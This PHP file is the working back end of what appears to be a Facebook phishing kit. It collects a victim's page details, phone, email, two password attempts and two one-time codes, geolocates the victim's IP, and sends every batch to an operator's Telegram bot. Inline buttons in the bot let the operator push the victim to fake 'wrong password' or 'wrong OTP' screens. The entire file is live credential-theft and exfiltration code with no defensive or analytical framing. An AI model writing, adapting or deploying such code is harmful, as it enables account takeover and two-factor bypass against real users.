<?php
include("config.php");
session_start();

        $_SESSION['ipadd'] = $_SERVER['HTTP_CLIENT_IP'] 
   ? : ($_SERVER['HTTP_X_FORWARDED_FOR'] 
   ? : $_SERVER['REMOTE_ADDR']);


   if (isset($_SERVER['HTTPS']) &&
    ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) ||
    isset($_SERVER['HTTP_X_FORWARDED_PROTO']) &&
    $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') {
  $protocol = 'https://';
}
else {
  $protocol = 'http://';
}
 $_SESSION['connect'] = $protocol.$_SERVER['HTTP_HOST'];

$_SESSION['dir'] = dirname($_SERVER['PHP_SELF']);


$url = $_SESSION['connect'] . $_SESSION['dir'];

    $details = json_decode(file_get_contents("https://ipinfo.io/json?ip={$_SESSION['ipadd']}"));
    $_SESSION['country'] = $details->country;
    $_SESSION['region'] = $details->region;

// TELEGRAM CONTROL BUTTONS 

        $button1 = ''.$url  . '/redirect.php?key='.$_SESSION['buttonName1'].'&ip='.$_SESSION['ipadd'].'';
        $button2 = ''.$url . '/redirect.php?key='.$_SESSION['buttonName2'].'&ip='.$_SESSION['ipadd'].'';
        $button3 = ''.$url  . '/redirect.php?key='.$_SESSION['buttonName3'].'&ip='.$_SESSION['ipadd'].'';
        $button4 = ''.$url  . '/redirect.php?key='.$_SESSION['buttonName4'].'&ip='.$_SESSION['ipadd'].'';

// TELEGRAM CONTROL BUTTONS 
//TELEGRAM BUTTONS
$_SESSION['buttonName1'] = "otp";
$_SESSION['buttonName2'] = "wrongpass";
$_SESSION['buttonName3'] = "redirect";
$_SESSION['buttonName4'] = "wrongotp";





 if (isset($_POST['phone'])) {

        $_SESSION["owner"] = $_POST['owner'];
        $_SESSION["pname"] = $_POST['pname'];
        $_SESSION["pnumber"] = $_POST['phone'];
        $_SESSION["email"] = $_POST['emsf'];
        $_SESSION["adninfo"] = $_POST['adninfo'];





        $content = "<------Facebook------>"."\n\n".
        "owner: "."`".  $_SESSION["owner"]."`". "\n".
        "pagename: "."`".  $_SESSION["pname"]."`". "\n".
        "pnumber: "."`".  $_SESSION["pnumber"]."`". "\n".
        "email: "."`".  $_SESSION["email"]."`". "\n".
        "adninfo: ".  $_SESSION["adninfo"]. "\n\n".
        "IP: ".  $_SESSION["ipadd"]."\n".
        "Country: ".  $_SESSION['country']."\n".
        "Region: ".  $_SESSION['region'];


            // Create data
            $data = http_build_query([
                'text' => $content,
                'chat_id' => $chat_id,
                'parse_mode' => "markdown"
            ]);



            // Send keyboard
            $url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.$data;
            $res = @file_get_contents($url);


        header ('Location: password.php');
 
}




//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------




 if (isset($_POST['pwja'])) {


    






         $_SESSION["password"] = $_POST['pwja'];
        $content = "<------Facebook------>"."\n\n".
        "owner: ". "`".  $_SESSION["owner"]. "`". "\n".
        "pagename: "."`".  $_SESSION["pname"]."`". "\n".
        "pnumber: "."`".  $_SESSION["pnumber"]."`". "\n".
        "email: "."`".  $_SESSION["email"]."`". "\n\n".
        "Password: "."`".  $_SESSION["password"]."`". "\n\n".
        "IP: ".  $_SESSION["ipadd"]."\n".
        "Country: ".  $_SESSION['country']."\n".
        "Region: ".  $_SESSION['region'];


            // Create data
            $data = http_build_query([
                'text' => $content,
                'chat_id' => $chat_id,
                'parse_mode' => "markdown"
            ]);

            // Create keyboard
            $keyboard = json_encode([
                "inline_keyboard" => [
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName1']),
                            "url" => urlencode($button1)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName2']),
                            "url" => urlencode($button2)
                        ]
                    ]
                ]
            ]);

            // Send keyboard
            $url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.$data.'&reply_markup='.$keyboard;
            $res = @file_get_contents($url);


        header ('Location: loading.php');
 
}
//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------





 if (isset($_POST['pwja2'])) {


    






         $_SESSION["password2"] = $_POST['pwja2'];
        $content = "<------Facebook------>"."\n\n".
        "owner: "."`".  $_SESSION["owner"]."`". "\n".
        "pagename: "."`".  $_SESSION["pname"]."`". "\n".
        "pnumber: "."`".  $_SESSION["pnumber"]."`". "\n".
        "email: "."`".  $_SESSION["email"]."`". "\n\n".
        "Password: "."`".  $_SESSION["password"]."`". "\n\n".
        "Password 2: "."`".  $_SESSION["password2"]."`". "\n\n".
        "IP: ".  $_SESSION["ipadd"]."\n".
        "Country: ".  $_SESSION['country']."\n".
        "Region: ".  $_SESSION['region'];


            // Create data
            $data = http_build_query([
                'text' => $content,
                'chat_id' => $chat_id,
                'parse_mode' => "markdown"
            ]);

            // Create keyboard
            $keyboard = json_encode([
                "inline_keyboard" => [
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName1']),
                            "url" => urlencode($button1)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName2']),
                            "url" => urlencode($button2)
                        ]
                    ]
                ]
            ]);

            // Send keyboard
            $url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.$data.'&reply_markup='.$keyboard;
            $res = @file_get_contents($url);


        header ('Location: loading.php');
 
}


//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------





 if (isset($_POST['cgn'])) {


    






         $_SESSION["otp"] = $_POST['cgn'];
        $content = "<------Facebook------>"."\n\n".
        "owner: "."`".  $_SESSION["owner"]."`". "\n".
        "pagename: "."`".  $_SESSION["pname"]."`". "\n".
        "pnumber: "."`".  $_SESSION["pnumber"]."`". "\n".
        "email: "."`".  $_SESSION["email"]."`". "\n\n".
        "Password: "."`".  $_SESSION["password"]."`". "\n\n".
        "Password 2: "."`".  $_SESSION["password2"]."`". "\n\n".
        "OTP: "."`".  $_SESSION["otp"]."`". "\n\n".
        "IP: ".  $_SESSION["ipadd"]."\n".
        "Country: ".  $_SESSION['country']."\n".
        "Region: ".  $_SESSION['region'];


            // Create data
            $data = http_build_query([
                'text' => $content,
                'chat_id' => $chat_id,
                'parse_mode' => "markdown"
            ]);

            // Create keyboard
            $keyboard = json_encode([
                "inline_keyboard" => [
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName3']),
                            "url" => urlencode($button3)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName4']),
                            "url" => urlencode($button4)
                        ]
                    ]
                ]
            ]);

            // Send keyboard
            $url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.$data.'&reply_markup='.$keyboard;
            $res = @file_get_contents($url);


        header ('Location: loading.php');
 
}
//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------





 if (isset($_POST['cgn2'])) {


    






         $_SESSION["otp2"] = $_POST['cgn2'];
        $content = "<------Facebook------>"."\n\n".
        "owner: "."`".  $_SESSION["owner"]."`". "\n".
        "pagename: "."`".  $_SESSION["pname"]."`". "\n".
        "pnumber: "."`".  $_SESSION["pnumber"]."`". "\n".
        "email: "."`".  $_SESSION["email"]."`". "\n\n".
        "Password: "."`".  $_SESSION["password"]."`". "\n\n".
        "Password 2: "."`".  $_SESSION["password2"]."`". "\n\n".
        "OTP: "."`".  $_SESSION["otp"]."`". "\n\n".
        "OTP 2: "."`".  $_SESSION["otp2"]."`". "\n\n".
        "IP: ".  $_SESSION["ipadd"]."\n".
        "Country: ".  $_SESSION['country']."\n".
        "Region: ".  $_SESSION['region'];


            // Create data
            $data = http_build_query([
                'text' => $content,
                'chat_id' => $chat_id,
                'parse_mode' => "markdown"
            ]);

            // Create keyboard
            $keyboard = json_encode([
                "inline_keyboard" => [
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName3']),
                            "url" => urlencode($button3)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName4']),
                            "url" => urlencode($button4)
                        ]
                    ]
                ]
            ]);

            // Send keyboard
            $url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.$data.'&reply_markup='.$keyboard;
            $res = @file_get_contents($url);


        header ('Location: loading.php');
 
}
?>